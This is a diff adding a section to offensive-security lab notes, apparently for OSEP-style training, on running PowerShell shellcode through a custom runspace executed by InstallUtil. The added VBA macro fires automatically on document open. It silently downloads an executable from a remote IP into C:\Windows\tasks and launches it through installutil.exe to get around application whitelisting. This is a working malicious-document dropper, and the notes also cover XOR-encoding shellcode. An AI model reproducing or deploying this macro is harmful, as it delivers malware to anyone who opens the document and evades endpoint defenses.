@@ -48,3 +48,31 @@ Remember to change whatever that is in the buf variable to the shellcode generat
 - With single byte XOR encryption of shellcode
 - Need to XOR your shellcode with the ![XOR_Helper](..\XOR_Encoder_Helper\xor_encoder.cs) courtesy of https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/XOR%20Shellcode%20Encoder/Program.cs
 
+
+
+# Round 3 - Powershell in Custom Runspace, pulled and then executed by InstallUtil
+- Custom.exe is the CustomPowershellRunspace
+- Do note the diff between 32bit and 64-bit powershell
+- Inside Custom.exe, we should be calling the 64-bit shellcode because powershell is likely executing in 64-bit context due ot the fact that installutil is in 64-bit
+
+![alt text](image.png)
+
+```vba
+Sub MyMacro()
+    Dim s As String
+    Dim s1 As String
+    s = "powershell.exe iwr -uri http://192.168.45.169/custom.exe -outfile C:\\Windows\\tasks\\custom.exe"
+    s1 = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\custom.exe"
+    Set oShell = CreateObject("WScript.Shell")
+    oShell.Run s, 0, True  ' Waits until download finishes
+    oShell.Run s1, 0, False
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+```
